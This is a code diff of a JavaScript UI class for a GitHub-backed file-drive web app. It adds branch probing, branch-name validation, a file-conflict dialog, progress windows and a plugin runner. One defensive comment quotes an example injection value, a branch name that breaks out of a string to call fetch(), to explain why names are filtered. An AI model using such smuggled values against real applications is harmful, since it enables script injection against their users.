+     * 拿 css/style.css 做探针：它是 index.html 里第一个从分支加载的东西，
+     * 它 404 就说明整套都加载不了。
+     */
+    async _probeBranch(branch) {
+        const url = 'https://cdn.jsdelivr.net/gh/Cool-zimo/github_drive@' +
+                    encodeURIComponent(branch) + '/css/style.css';
+        try {
+            const ctrl = new AbortController();
+            const timer = setTimeout(() => ctrl.abort(), 8000);
+            const r = await fetch(url, { method: 'HEAD', signal: ctrl.signal, cache: 'no-store' });
+            clearTimeout(timer);
+            return { ok: r.ok, status: r.status };
         } catch (e) {
-            const plazaEl = document.getElementById('version-plaza');
-            if (plazaEl) plazaEl.innerHTML = '<div style="text-align:center;padding:20px;color:#ef4444;font-size:13px;">加载失败: ' + e.message + '<br><span style="font-size:11px;color:#9ca3af;">请检查网络连接</span></div>';
+            return { ok: false, status: 0, error: String(e && e.message || e) };
         }
     }
-    
-    loadVersion(branch) {
-        // ★ 分支名会被拼进 CDN 前缀（index.html 头部），
-        //   也会写进 localStorage 影响后续每次启动。
-        //   只放行安全的 ref 字符集，挡掉引号/空格/.. 等。
-        if (typeof branch !== 'string' || !/^[A-Za-z0-9._\/-]+$/.test(branch)
-            || branch.indexOf('..') !== -1) {
-            alert('分支名不合法，已忽略：' + String(branch).slice(0, 80));
+
+    async loadVersionPlaza() {
+        const plazaEl = document.getElementById('version-plaza');
+        if (!plazaEl) return;
+
+        let manifest = { branches: [] };
+        try {
+            const res = await fetch('https://raw.githubusercontent.com/Cool-zimo/github_drive/main/preview-branches.json?t=' + Date.now());
+            if (res.ok) manifest = await res.json();
+        } catch (e) { /* 清单拿不到就只用 API 结果 */ }
+
+        const meta = new Map();
+        for (const b of (manifest.branches || [])) {
+            if (b && typeof b.branch === 'string') meta.set(b.branch, b);
+        }
+
+        // ── 用 API 列出真实存在的 preview/* 分支 ──
+        // 清单文件漏了 10 个分支（实际 22 个，清单只有 12 个），
+        // 光看清单会少一半可选版本。
+        const found = new Map();
+        try {
+            const app = this.app;
+            const user = app && app.storage ? app.storage.getUser() : null;
+            if (user && app.api && app.api.request) {
+                const list = await app.api.request(
+                    '/repos/Cool-zimo/github_drive/branches?per_page=100');
+                for (const b of (list || [])) {
+                    if (!b.name || b.name.indexOf('preview/') !== 0) continue;
+                    if (!this._safeBranch(b.name)) continue;
+                    found.set(b.name, { branch: b.name });
+                }
+            }
+        } catch (e) { /* 没登录就退回清单 */ }
+
+        for (const k of meta.keys()) if (!found.has(k)) found.set(k, meta.get(k));
+
+        this._vsList = Array.from(found.values()).map(b => {
+            const m = meta.get(b.branch) || {};
+            const seg = b.branch.split('/');
+            return {
+                branch: b.branch,
+                name: m.name || (seg[seg.length - 1] || b.branch),
+                author: m.author || (seg.length >= 3 ? seg[1] : 'unknown'),
+                description: m.description || '',
+                version: m.version || '',
+                prNumber: m.prNumber || null,
+                updatedAt: m.updatedAt || '',
+                probe: null          // 探测结果，渲染后再补
+            };
+        });
+
+        this._renderVersionList();
+
+        // ── 后台并发探活，结果逐个回填 ──
+        // 22 个分支逐个探太慢，并发 6；每个只探一次，结果缓存在对象上
+        const queue = this._vsList.slice();
+        const worker = async () => {
+            while (queue.length) {
+                const item = queue.shift();
+                item.probe = await this._probeBranch(item.branch);
+                const badge = document.getElementById('vs-badge-' + this._vsIdxOf(item));
+                if (badge) badge.outerHTML = this._vsBadge(item);
+            }
+        };
+        await Promise.all([0, 0, 0, 0, 0, 0].map(worker));
+        this._renderVersionList();
+    }
+
+    _vsIdxOf(item) { return this._vsList.indexOf(item); }
+
+    _vsBadge(item) {
+        const p = item.probe;
+        if (!p) return '<span id="vs-badge-' + this._vsIdxOf(item) +
+            '" style="font-size:11px;color:#9ca3af;">检测中…</span>';
+        return p.ok
+            ? '<span id="vs-badge-' + this._vsIdxOf(item) +
+              '" style="font-size:11px;color:#059669;background:#ecfdf5;padding:2px 8px;border-radius:10px;">✓ 可加载</span>'
+            : '<span id="vs-badge-' + this._vsIdxOf(item) +
+              '" style="font-size:11px;color:#dc2626;background:#fef2f2;padding:2px 8px;border-radius:10px;" title="HTTP ' +
+              (p.status || '错误') + '">✗ 不可用</span>';
+    }
+
+    _renderVersionList() {
+        const plazaEl = document.getElementById('version-plaza');
+        if (!plazaEl || !this._vsList) return;
+
+        const q = (this._vsFilter || '').trim().toLowerCase();
+        let list = this._vsList.filter(b =>
+            // ★ 纵深防御：清单来自 PR 可控的 preview-branches.json，
+            //   渲染处虽然已经逐字段 esc() 转义（所以不构成 XSS），
+            //   但不合法的名字本来就不该出现在列表里 ——
+            //   一个 "preview/x');fetch(...)//" 出现在界面上，
+            //   用户会以为是真版本而点它。过滤比转义更靠前一步。
+            !!this._safeBranch(b.branch) &&
+            (!q || b.branch.toLowerCase().includes(q) ||
+            (b.name || '').toLowerCase().includes(q) ||
+            (b.author || '').toLowerCase().includes(q) ||
+            (b.description || '').toLowerCase().includes(q)));
+
+        const sort = this._vsSort || 'time';
+        list.sort((a, b) => {
+            if (sort === 'author') return String(a.author).localeCompare(String(b.author)) ||
+                                           String(a.branch).localeCompare(String(b.branch));
+            if (sort === 'name') return String(a.name).localeCompare(String(b.name));
+            return String(b.updatedAt || '').localeCompare(String(a.updatedAt || '')) ||
+                   String(a.branch).localeCompare(String(b.branch));
+        });
+
+        const cnt = document.getElementById('vs-count');
+        if (cnt) cnt.textContent = '共 ' + list.length + ' 个' +
+            (list.length !== this._vsList.length ? '（总 ' + this._vsList.length + '）' : '');
+
+        if (!list.length) {
+            plazaEl.innerHTML = '<div style="text-align:center;padding:30px;color:#9ca3af;font-size:13px;">' +
+                (this._vsList.length ? '没有匹配的版本' : '暂无社区版本<br><span style="font-size:11px;">成为第一个贡献者吧！</span>') +
+                '</div>';
             return;
         }
-        localStorage.setItem('gd_custom_branch', branch);
-        alert('正在加载版本: ' + branch + '\n页面将刷新以加载新版本。');
-        location.reload();
+
+        const cur = localStorage.getItem('gd_custom_branch') || 'main';
+        const esc = this.escapeHtml.bind(this);
+
+        plazaEl.innerHTML = list.map((b, i) => {
+            const isCurrent = cur === b.branch;
+            const bad = b.probe && b.probe.ok === false;
+            return `
+            <div data-branch="${esc(b.branch)}" data-idx="${this._vsIdxOf(b)}"
+                style="padding:12px;border:1px solid ${isCurrent ? '#2563eb' : '#e5e7eb'};border-radius:8px;margin-bottom:8px;cursor:${bad ? 'not-allowed' : 'pointer'};background:${isCurrent ? '#eff6ff' : (bad ? '#fafafa' : '#fff')};opacity:${bad ? '0.65' : '1'};"
+                onmouseover="if(!${bad}){this.style.borderColor='#2563eb';this.style.background='#f8fafc'}"
+                onmouseout="this.style.borderColor='${isCurrent ? '#2563eb' : '#e5e7eb'}';this.style.background='${isCurrent ? '#eff6ff' : (bad ? '#fafafa' : '#fff')}'">
+                <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:4px;">
+                    <div style="font-weight:600;font-size:14px;color:#111827;min-width:0;overflow:hidden;text-overflow:ellipsis;">${esc(b.name || b.branch)}</div>
+                    <div style="display:flex;gap:6px;flex-shrink:0;align-items:center;">
+                        ${b.version ? '<span style="font-size:11px;background:#f3f4f6;color:#6b7280;padding:2px 8px;border-radius:10px;">v' + esc(b.version) + '</span>' : ''}
+                        ${this._vsBadge(b)}
+                    </div>
+                </div>
+                <div style="font-size:12px;color:#6b7280;margin-bottom:4px;">👤 ${esc(b.author || 'unknown')}${b.prNumber ? ' · PR #' + esc(String(b.prNumber)) : ''}${b.updatedAt ? ' · ' + esc(String(b.updatedAt).slice(0, 10)) : ''}</div>
+                ${b.description ? '<div style="font-size:12px;color:#374151;line-height:1.4;">' + esc(b.description) + '</div>' : ''}
+                <div style="font-size:11px;color:#9ca3af;margin-top:6px;font-family:monospace;word-break:break-all;">${esc(b.branch)}</div>
+                ${isCurrent ? '<div style="font-size:11px;color:#2563eb;margin-top:4px;font-weight:600;">✅ 当前使用中</div>' : ''}
+            </div>`;
+        }).join('');
+
+        plazaEl.querySelectorAll('[data-branch]').forEach(el => {
+            el.addEventListener('click', () => {
+                const idx = parseInt(el.getAttribute('data-idx'), 10);
+                const item = this._vsList[idx];
+                if (item && item.probe && item.probe.ok === false) {
+                    this._vsStatus('✗ 该版本目前无法加载（HTTP ' + (item.probe.status || '错误') +
+                        '），切换会导致页面打不开。已阻止。', '#dc2626');
+                    return;
+                }
+                this.loadVersion(el.getAttribute('data-branch'));
+            });
+        });
     }
 
-    switchBranch() {
-        const branch = document.getElementById('branch-input').value.trim();
-        if (!branch) { alert('请输入分支名'); return; }
-        
-        localStorage.setItem('gd_custom_branch', branch);
-        alert('已切换到分支: ' + branch + '\n页面将刷新以加载新版本。\n\n注意：如果分支不存在或 Pages 未部署，页面可能无法正常加载。');
-        location.reload();
+    /**
+     * 真正切换。写入 localStorage 之前必须探活 ——
+     * 一旦写进去又加载不出来，页面就白屏了，而白屏里没有设置页可点。
+     */
+    async loadVersion(branch) {
+        const safe = this._safeBranch(branch);
+        if (!safe) {
+            this._vsStatus('✗ 分支名不合法，已忽略：' + String(branch).slice(0, 80), '#dc2626');
+            return;
+        }
+        if (safe === (localStorage.getItem('gd_custom_branch') || 'main')) {
+            this._vsStatus('已经是当前版本了', '#6b7280');
+            return;
+        }
+
+        this._vsStatus('正在检测「' + safe + '」能否加载…', '#6b7280');
+        const probe = await this._probeBranch(safe);
+        if (!probe.ok) {
+            this._vsStatus('✗ 无法加载（HTTP ' + (probe.status || '错误') +
+                '）。已阻止切换 —— 这个版本现在切过去会白屏。', '#dc2626');
+            return;
+        }
+
+        // ★ 记住上一个可用版本，万一新版本有问题能一键退回
+        const prev = localStorage.getItem('gd_custom_branch');
+        if (prev && prev !== safe) localStorage.setItem('gd_prev_branch', prev);
+
+        localStorage.setItem('gd_custom_branch', safe);
+        this._vsStatus('✓ 已切换到 ' + safe + '，正在刷新…', '#059669');
+        setTimeout(() => location.reload(), 600);
+    }
+
+    async switchBranch() {
+        const el = document.getElementById('branch-input');
+        const raw = el ? el.value : '';
+        const safe = this._safeBranch(raw);
+        // ★ 旧版这里完全没校验，直接写 localStorage 拼进 CDN URL。
+        //   而 loadVersion 有校验 —— 同一个功能两处标准，这就是漏洞的来源。
+        if (!safe) {
+            this._vsStatus('✗ 分支名不合法。只允许字母、数字、. _ / - ，且不含 ..', '#dc2626');
+            return;
+        }
+        await this.loadVersion(safe);
     }
 
     resetToMain() {
         localStorage.removeItem('gd_custom_branch');
-        alert('已恢复官方版本 (main)，页面将刷新。');
-        location.reload();
+        localStorage.removeItem('gd_prev_branch');
+        // 带 safe=1 绕过一切缓存与残留状态
+        const u = new URL(window.location.href);
+        u.search = '?safe=1';
+        u.hash = '';
+        window.location.replace(u.toString());
     }
 
     showBackendSettings() {
@@ -1691,7 +2915,64 @@ class UI {
 
     closeModal() {
         this._pagesMonitorStopped = true;
-        document.getElementById('modal-container').innerHTML = '';
+        // ★ 冲突弹窗被 ESC / 点遮罩关掉时，必须给出决定 ——
+        //   否则 Promise 永远不 resolve，上传流程卡死在半路。
+        //   按"跳过"处理：宁可不传，也不能替用户覆盖已有文件。
+        if (this._conflictFallback) {
+            const fb = this._conflictFallback;
+            this._conflictFallback = null;
+            fb();
+        }
+        const container = document.getElementById('modal-container');
+        // 先取出旧节点，再立刻腾空容器 —— 顺序不能反，
+        // 否则紧跟其后的 showModal 写进来的新弹窗会被退场定时器清掉。
+        const overlay = container.querySelector('.modal-overlay');
+        container.innerHTML = '';
+        this._playModalExit(overlay);
+    }
+
+    /**
+     * 弹窗退场动画。
+     *
+     * ★ 为什么不能简单写成「加 is-closing，等 180ms 再清空容器」：
+     *   设置里有一批 action 是 `ui.closeModal(); ui.showStorageManager();`
+     *   —— 关掉旧的、立刻开新的。延迟清空会把刚打开的新弹窗一起清掉，
+     *   表现是"点了设置项，弹窗闪一下就没了"。
+     *
+     *   所以这里先把旧节点摘出来、挪到独立退场层，容器立刻腾空，
+     *   新弹窗写进去不会被定时器误伤。
+     */
+    _playModalExit(overlay) {
+        if (!overlay) return;
+        try {
+            if (window.matchMedia &&
+                window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+
+            let layer = document.getElementById('modal-exit-layer');
+            if (!layer) {
+                layer = document.createElement('div');
+                layer.id = 'modal-exit-layer';
+                document.body.appendChild(layer);
+            }
+            // 同一时刻只留一个退场节点，否则连续开关会层层堆叠
+            layer.innerHTML = '';
+
+            overlay.classList.add('is-closing');
+            layer.appendChild(overlay);
+            setTimeout(() => { try { overlay.remove(); } catch (e) {} }, 260);
+        } catch (e) { /* 动画失败不影响关闭本身 */ }
+    }
+
+    /** 上传列表里把某个文件标成"已跳过" */
+    markUploadSkipped(name) {
+        const el = document.querySelector(`[data-upload-name="${CSS.escape(name)}"]`);
+        if (el) {
+            el.style.opacity = '0.5';
+            const tag = document.createElement('span');
+            tag.textContent = '已跳过（同名）';
+            tag.style.cssText = 'font-size:11px;color:#92400e;margin-left:6px;';
+            el.appendChild(tag);
+        }
     }
 
     /**
@@ -1908,10 +3189,99 @@ class UI {
     }
 
     /**
+     * 同名文件冲突弹窗（仿 Windows 资源管理器）
+     *
+     * @param {{name,newSize,newDate,oldSize,oldDate,remaining}} info
+     * @returns {Promise<{action:'replace'|'skip'|'rename', applyAll:boolean}>}
+     */
+    showFileConflict(info) {
+        return new Promise((resolve) => {
+            const fmt = (b) => {
+                if (!b && b !== 0) return '—';
+                const k = 1024, u = ['B', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(b) / Math.log(k));
+                return (b / Math.pow(k, i)).toFixed(1) + ' ' + u[i];
+            };
+            const dt = (d) => {
+                if (!d) return '—';
+                try {
+                    return d.toLocaleString(undefined, {
+                        year: 'numeric', month: '2-digit', day: '2-digit',
+                        hour: '2-digit', minute: '2-digit'
+                    });
+                } catch (e) { return '—'; }
+            };
+            const esc = (v) => String(v ?? '').replace(/[&<>"']/g, c =>
+                ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+
+            const name = esc(info.name);
+            const body = `
+                <div style="display:flex;gap:14px;align-items:flex-start;">
+                    <div style="font-size:36px;line-height:1;">⚠️</div>
+                    <div style="flex:1;min-width:0;">
+                        <div style="font-size:14px;color:#111827;margin-bottom:12px;word-break:break-all;">
+                            此位置已存在名为 <b>「${name}」</b> 的文件
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+                            <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:10px;padding:12px;">
+                                <div style="font-size:11px;color:#6b7280;margin-bottom:6px;">目标中的文件</div>
+                                <div style="font-size:13px;font-weight:600;color:#374151;word-break:break-all;">${name}</div>
+                                <div style="font-size:12px;color:#6b7280;margin-top:6px;">${fmt(info.oldSize)}</div>
+                                <div style="font-size:12px;color:#9ca3af;margin-top:2px;">${dt(info.oldDate)}</div>
+                            </div>
+                            <div style="background:#f0f7ff;border:1px solid #bfdbfe;border-radius:10px;padding:12px;">
+                                <div style="font-size:11px;color:#6b7280;margin-bottom:6px;">正在上传的文件</div>
+                                <div style="font-size:13px;font-weight:600;color:#374151;word-break:break-all;">${name}</div>
+                                <div style="font-size:12px;color:#6b7280;margin-top:6px;">${fmt(info.newSize)}</div>
+                                <div style="font-size:12px;color:#9ca3af;margin-top:2px;">${dt(info.newDate)}</div>
+                            </div>
+                        </div>
+                        ${info.remaining ? `<div style="margin-top:12px;font-size:12px;color:#92400e;background:#fffbeb;border:1px solid #fde68a;border-radius:8px;padding:8px 10px;">还有 ${info.remaining} 个同名文件待处理</div>` : ''}
+                        <label style="display:flex;align-items:center;gap:8px;margin-top:12px;cursor:pointer;font-size:13px;color:#374151;">
+                            <input type="checkbox" id="cf-apply-all" style="width:15px;height:15px;cursor:pointer;">
+                            <span>对之后所有冲突执行此操作</span>
+                        </label>
+                    </div>
+                </div>
+            `;
+            const finish = (action) => {
+                // ★ 必须先撤掉 fallback 再关弹窗。
+                //   closeModal() 会触发 _conflictFallback（处理 ESC/取消），
+                //   而它 resolve 的是 'skip' —— Promise 一旦落定就改不了，
+                //   于是点"替换"也变成"跳过"（实测确实如此）。
+                if (this._conflictDone) return;
+                this._conflictDone = true;
+                const applyAll = !!document.getElementById('cf-apply-all')?.checked;
+                this._conflictFallback = null;
+                this.closeModal();
+                resolve({ action, applyAll });
+            };
+            this._conflictDone = false;
+            // ★ 三个选项都要挂到 window：onclick 里访问不到闭包里的 finish
+            window.__gdConflictPick = finish;
+            const btns = `
+                <button class="btn-secondary" onclick="window.__gdConflictPick('rename')">保留两个文件</button>
+                <button class="btn-secondary" onclick="window.__gdConflictPick('skip')">跳过此文件</button>
+                <button class="btn-primary" onclick="window.__gdConflictPick('replace')">替换目标中的文件</button>
+            `;
+            this.showModal('替换或跳过文件', body, btns);
+            // 关闭弹窗（取消）时按"跳过"处理，绝不能默认覆盖
+            // 关闭弹窗（ESC / 点遮罩 / 取消）时按"跳过"处理，绝不能默认覆盖
+            this._conflictFallback = () => {
+                if (this._conflictDone) return;
+                this._conflictDone = true;
+                this._conflictFallback = null;
+                resolve({ action: 'skip', applyAll: false });
+            };
+        });
+    }
+
+    /**
      * 分享模态框
      */
     showShareModal(files) {
         const fileNames = files.map(f => f.name).join(', ');
+        const folderCount = files.filter(f => f.isFolder).length;
         this.showModal(
             I18n.t('share.title'),
             `
@@ -1925,10 +3295,11 @@ class UI {
                     <input type="text" id="share-desc" placeholder="这些是我分享的文件">
                 </div>
                 <div class="form-group">
-                    <label>要分享的文件（${files.length} 个）</label>
+                    <label>${folderCount ? `要分享的条目（${files.length} 个，含 ${folderCount} 个文件夹）` : `要分享的文件（${files.length} 个）`}</label>
                     <div style="background:#f6f8fa;padding:12px;border-radius:6px;font-size:13px;max-height:120px;overflow-y:auto;">
-                        ${files.map(f => `<div>📄 ${f.name}</div>`).join('')}
+                        ${files.map(f => `<div>${f.isFolder ? '📁' : '📄'} ${f.name}</div>`).join('')}
                     </div>
+                    ${folderCount ? `<p class="form-hint">文件夹会包含其中所有文件，并保持目录结构</p>` : ''}
                 </div>
                 <div id="share-progress" class="upload-progress hidden"></div>
             `,
@@ -1959,6 +3330,19 @@ class UI {
 
     /** 打开分享进度弹窗 */
     showShareProgress(fileCount) {
+        this._lastSharePct = 0;
+        if (typeof TaskDock !== 'undefined') {
+            this._shareTaskId = TaskDock.create({
+                type: 'share',
+                title: `正在分享 ${fileCount} 个文件`,
+                single: true,
+                items: [],
+                note: '准备中…',
+                expand: true
+            });
+            this._shareProgressOpen = true;
+            return;
+        }
         const steps = this.shareSteps;
         const body = `
             <div class="share-prog">
@@ -1989,8 +3373,21 @@ class UI {
      * @param {string} msg 当前步骤描述
      */
     updateShareProgress(percent, msg) {
+        if (typeof TaskDock !== 'undefined' && this._shareTaskId) {
+            TaskDock.setPercent(this._shareTaskId, percent, msg);
+            return;
+        }
         if (!this._shareProgressOpen) return;
-        const pct = Math.max(0, Math.min(100, Math.round(percent || 0)));
+        let pct = Math.max(0, Math.min(100, Math.round(percent || 0)));
+        /**
+         * ★ 进度只增不减。
+         *   分享是多阶段流程，各阶段自己算百分比，一旦某个阶段从较小的值
+         *   起步（例如读取刚结束 32%，转去上传又从 10% 报），进度条会往回缩，
+         *   看着就像卡住甚至坏了。这里兜底保证单调。
+         */
+        this._lastSharePct = this._lastSharePct || 0;
+        if (pct < this._lastSharePct) pct = this._lastSharePct;
+        this._lastSharePct = pct;
 
         const fill = document.getElementById('sp-fill');
         const pctEl = document.getElementById('sp-pct');
@@ -2020,7 +3417,13 @@ class UI {
     }
 
     /** 关闭进度弹窗（成功或失败都要调，否则弹窗会一直挂着） */
-    closeShareProgress() {
+    closeShareProgress(failed, msg) {
+        if (typeof TaskDock !== 'undefined' && this._shareTaskId) {
+            TaskDock.finish(this._shareTaskId, failed ? (msg || '分享失败') : null);
+            this._shareTaskId = null;
+            this._shareProgressOpen = false;
+            return;
+        }
         this._shareProgressOpen = false;
         // closeModal 会清掉 modal-container，进度弹窗也在一起
         if (document.getElementById('sp-fill')) this.closeModal();
@@ -2111,6 +3514,11 @@ class UI {
     showShareList(shares, opts) {
         const container = document.getElementById('file-list');
         if (!container) return;
+        // ★ switchView 对非文件视图会设置 fileList.style.display='none'（内联样式，
+        //   优先级高于 CSS 类）。分享列表复用的是同一个容器，不把内联样式清掉的话，
+        //   数据全都渲染好了却一个字都看不见 —— 表现就是"我的分享一直是空的"。
+        //   实测：容器里有 12 张卡片、宽高却是 0×0。
+        container.style.display = '';
         const o = opts || {};
 
         if (o.loading && (!shares || shares.length === 0)) {
@@ -2202,6 +3610,8 @@ class UI {
     renderExploreShares(shares, hasMore) {
         const container = document.getElementById('file-list');
         if (!container) return;
+        // 同上：switchView 隐藏了容器，这里必须恢复，否则发现分享也是空白
+        container.style.display = '';
         container.className = 'explore-list';
 
         // 按 repoName 去重（分页加载可能重复）
@@ -2474,16 +3884,20 @@ class UI {
      *      导致先开的插件再也收不到宿主响应，且关闭时泄漏监听。
      * 统一走全屏后 ② 自动消失。
      */
+    /**
+     * 打开插件。
+     *
+     * 以前是全屏覆盖层（.plugin-overlay），一开就把网盘整个挡住，
+     * 想一边跑插件一边翻文件根本不行。现在改成和上传/分享同款的可拖动窗口：
+     * 拖到侧边收成小窗，点开继续，多个插件各占一个窗口，还能全屏。
+     *
+     * ★ iframe 创建后交给 TaskDock，之后**不再移动**——
+     *   移动 iframe 会导致它重新加载，插件里填了一半的东西会全丢。
+     */
     showPluginRunner(plugin) {
         // 加随机后缀：同一毫秒内连开两个插件时，
         // 纯 Date.now() 会生成相同 id，后开的顶掉先开的记录
-        const modalId = 'plugin-runner-' + Date.now() + '-' + Math.random().toString(36).slice(2, 7);
-
-        // 外部 URL 插件：直接用 iframe 加载，无 blob 需要回收
-        if (plugin.externalUrl) {
-            this._mountPluginOverlay(modalId, plugin, plugin.externalUrl, null);
-            return;
-        }
+        const id = 'plugin-runner-' + Date.now() + '-' + Math.random().toString(36).slice(2, 7);
 
         // 注入 I18n 支持，让插件可以使用 window.I18n.t() 做双语
         const i18nScript = `
@@ -2502,15 +3916,51 @@ window.I18n = {
     }
 };
 </script>`;
-        const htmlWithI18n = plugin.html.replace('<head>', '<head>' + i18nScript).replace('<body>', i18nScript + '<body>');
-        const finalHtml = htmlWithI18n === plugin.html ? i18nScript + plugin.html : htmlWithI18n;
-        const blob = new Blob([finalHtml], { type: 'text/html' });
-        const url = URL.createObjectURL(blob);
-        this._mountPluginOverlay(modalId, plugin, url, url);
+
+        let src = plugin.externalUrl || null;
+        let blobUrl = null;
+        if (!src) {
+            const htmlWithI18n = plugin.html.replace('<head>', '<head>' + i18nScript).replace('<body>', i18nScript + '<body>');
+            const finalHtml = htmlWithI18n === plugin.html ? i18nScript + plugin.html : htmlWithI18n;
+            const blob = new Blob([finalHtml], { type: 'text/html' });
+            blobUrl = URL.createObjectURL(blob);
+            src = blobUrl;
+        }
+
+        const frame = document.createElement('iframe');
+        frame.className = 'plugin-frame';
+        frame.setAttribute('allow', 'clipboard-read; clipboard-write');
+        frame.src = src;
+
+        // 每个插件层独立持有 handler，互不覆盖
+        const messageHandler = (event) => {
+            if (event.data && event.data.type === 'gd-api') {
+                this.app.handlePluginMessage(event, plugin.id);
+            }
+        };
+        window.addEventListener('message', messageHandler);
+
+        this._pluginRunners = this._pluginRunners || {};
+        this._pluginRunners[id] = { messageHandler, url: blobUrl, pluginId: plugin.id };
+
+        // 交给任务坞托管：窗口由它创建，iframe 只是被挂进去
+        const winId = (typeof TaskDock !== 'undefined' && TaskDock.openPlugin)
+            ? TaskDock.openPlugin({
+                title: plugin.name,
+                icon: plugin.icon || (plugin.type === 'game' ? '🎮' : '🔌'),
+                mount: frame,
+                onClose: () => this.closePluginRunner(id, blobUrl)
+            })
+            : null;
+        this._pluginRunners[id].winId = winId;
+
+        // 任务坞缺失时兜底：退回原来的全屏层，保证插件至少能开
+        if (!winId) this._mountPluginOverlay(id, plugin, src, blobUrl);
+        return id;
     }
 
     /**
-     * 挂载全屏插件层（供 showPluginRunner 复用）
+     * 挂载全屏插件层（兜底路径，任务坞不可用时才走这里）
      * @param {string} modalId 唯一 id
      * @param {Object} plugin 插件信息
      * @param {string} src iframe 地址
@@ -2524,7 +3974,7 @@ window.I18n = {
         // 锁定页面滚动：全屏覆盖时背景不该跟着滚。
         // 只在第一个插件层打开时记录原值，避免多层嵌套时恢复到错误状态。
         this._pluginRunners = this._pluginRunners || {};
-        if (Object.keys(this._pluginRunners).length === 0) {
+        if (Object.keys(this._pluginRunners).length <= 1) {
             this._prevBodyOverflow = document.body.style.overflow;
             document.body.style.overflow = 'hidden';
         }
@@ -2547,46 +3997,37 @@ window.I18n = {
             <iframe class="plugin-frame" src="${src}" allow="clipboard-read; clipboard-write"></iframe>
         `;
         document.body.appendChild(overlay);
-
-        // 每个插件层独立持有 handler，互不覆盖
-        const messageHandler = (event) => {
-            if (event.data && event.data.type === 'gd-api') {
-                this.app.handlePluginMessage(event, plugin.id);
-            }
-        };
-        window.addEventListener('message', messageHandler);
+        this._pluginRunners[modalId].overlay = overlay;
 
         // ESC 关闭：全屏层最自然的退出方式
         const keyHandler = (e) => {
             if (e.key === 'Escape') this.closePluginRunner(modalId, blobUrl || '');
         };
         document.addEventListener('keydown', keyHandler);
-
-        this._pluginRunners[modalId] = { url: blobUrl, messageHandler, keyHandler };
+        this._pluginRunners[modalId].keyHandler = keyHandler;
     }
 
     /**
-     * 关闭插件层
-     * @param {string} modalId
+     * 关闭插件
+     * @param {string} id 插件运行 id
      * @param {string} url blob 地址（可空；外部 URL 插件没有）
      */
-    closePluginRunner(modalId, url) {
-        const overlay = document.getElementById(modalId);
-        if (overlay) overlay.remove();
-
-        const rec = this._pluginRunners && this._pluginRunners[modalId];
+    closePluginRunner(id, url) {
+        const rec = this._pluginRunners && this._pluginRunners[id];
         if (rec) {
             window.removeEventListener('message', rec.messageHandler);
-            document.removeEventListener('keydown', rec.keyHandler);
-            delete this._pluginRunners[modalId];
+            if (rec.keyHandler) document.removeEventListener('keydown', rec.keyHandler);
+            if (rec.overlay && rec.overlay.parentNode) rec.overlay.parentNode.removeChild(rec.overlay);
+            delete this._pluginRunners[id];
+            url = url || rec.url;
         }
-
         // blob URL 在所有路径下都要回收，否则内存泄漏
-        const blobUrl = url || (rec && rec.url);
-        if (blobUrl) URL.revokeObjectURL(blobUrl);
+        if (url) URL.revokeObjectURL(url);
 
-        // 所有插件层都关完了才恢复滚动
-        if (this._pluginRunners && Object.keys(this._pluginRunners).length === 0) {
+        // 兜底层的滚动锁要恢复；窗口模式本来就没锁，这里会被自然跳过
+        const anyOverlay = this._pluginRunners &&
+            Object.values(this._pluginRunners).some(r => r.overlay);
+        if (!anyOverlay && this._prevBodyOverflow !== null && this._prevBodyOverflow !== undefined) {
             document.body.style.overflow = this._prevBodyOverflow || '';
             this._prevBodyOverflow = null;
         }
@@ -2697,11 +4138,22 @@ window.I18n = {
      * 上传进度弹窗
      */
     showUploadProgress(files) {
-        // 移除已有弹窗
+        const fileList = Array.isArray(files) ? files : [files];
+        // ★ 改走任务坞：居中大弹窗会挡住整个界面，98 个文件的时候根本没法
+        //   同时看文件列表。任务坞可以拖到侧边变成小窗。
+        if (typeof TaskDock !== 'undefined') {
+            this._uploadTaskId = TaskDock.create({
+                type: 'upload',
+                title: `正在上传（${fileList.length} 个文件）`,
+                items: fileList.map(f => f.name || f.webkitRelativePath || '文件'),
+                expand: true
+            });
+            this._uploadTotalFiles = fileList.length;
+            return;
+        }
+        // 兜底：TaskDock 没加载出来时退回原来的弹窗
         const existing = document.getElementById('upload-progress-modal');
         if (existing) existing.remove();
-
-        const fileList = Array.isArray(files) ? files : [files];
         const filesHtml = fileList.map((f, i) => {
             const name = f.name || f.webkitRelativePath || '文件';
             return `
@@ -2739,6 +4191,10 @@ window.I18n = {
     }
 
     updateUploadProgress(index, percent) {
+        if (typeof TaskDock !== 'undefined' && this._uploadTaskId) {
+            TaskDock.updateItem(this._uploadTaskId, index, percent);
+            return;
+        }
         const bar = document.getElementById(`upload-bar-${index}`);
         const percentEl = document.getElementById(`upload-percent-${index}`);
         if (bar) bar.style.width = percent + '%';
@@ -2758,6 +4214,10 @@ window.I18n = {
     }
 
     setUploadSuccess(index) {
+        if (typeof TaskDock !== 'undefined' && this._uploadTaskId) {
+            TaskDock.setItemDone(this._uploadTaskId, index);
+            return;
+        }
         const item = document.getElementById(`upload-item-${index}`);
         const percentEl = document.getElementById(`upload-percent-${index}`);
         const bar = document.getElementById(`upload-bar-${index}`);
@@ -2772,7 +4232,12 @@ window.I18n = {
         if (overallEl) overallEl.textContent = `总进度：${overall}%（${this._uploadCompletedFiles}/${total}）`;
     }
 
-    hideUploadProgress() {
+    hideUploadProgress(failed, msg) {
+        if (typeof TaskDock !== 'undefined' && this._uploadTaskId) {
+            TaskDock.finish(this._uploadTaskId, failed ? (msg || '上传失败') : null);
+            this._uploadTaskId = null;
+            return;
+        }
         const modal = document.getElementById('upload-progress-modal');
         if (!modal) return;
         modal.classList.add('closing');
@@ -2781,6 +4246,15 @@ window.I18n = {
     
     // 显示下载进度
     showDownloadProgress(fileName) {
+        if (typeof TaskDock !== 'undefined') {
+            this._downloadTaskId = TaskDock.create({
+                type: 'download',
+                title: fileName,
+                items: [fileName],
+                expand: true
+            });
+            return;
+        }
         const existing = document.getElementById('download-progress-modal');
         if (existing) existing.remove();
         
@@ -2810,6 +4284,11 @@ window.I18n = {
     }
     
     updateDownloadProgress(percent, current, total) {
+        if (typeof TaskDock !== 'undefined' && this._downloadTaskId) {
+            TaskDock.updateItem(this._downloadTaskId, 0, percent);
+            if (current && total) TaskDock.setNote(this._downloadTaskId, `分片 ${current}/${total}`);
+            return;
